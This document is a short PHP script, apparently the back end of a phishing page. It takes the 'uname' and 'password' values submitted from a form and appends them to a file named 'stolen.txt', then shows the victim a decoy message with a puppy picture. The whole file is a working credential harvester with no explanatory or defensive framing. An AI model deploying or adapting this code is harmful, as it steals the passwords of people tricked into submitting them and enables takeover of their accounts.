<?php 
$myfile= fopen("stolen.txt","a");
$txt = "|<-name:pass->|";
$name = $_POST["uname"];
$pass = $_POST["password"];
$newline = "\n";

fwrite($myfile,$name);
fwrite($myfile,$txt);
fwrite($myfile,$pass);
fwrite($myfile,$newline);
fclose($myfile);
?>
<html>
<body>
<p>Very Nice! Now see this Good Boi</p>
<img src="https://proxy.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.designerdogsbreeds.com%2Fwp-content%2Fuploads%2F2015%2F03%2FGolden-Labrador-puppy.jpg&f=1">
</body>
</html>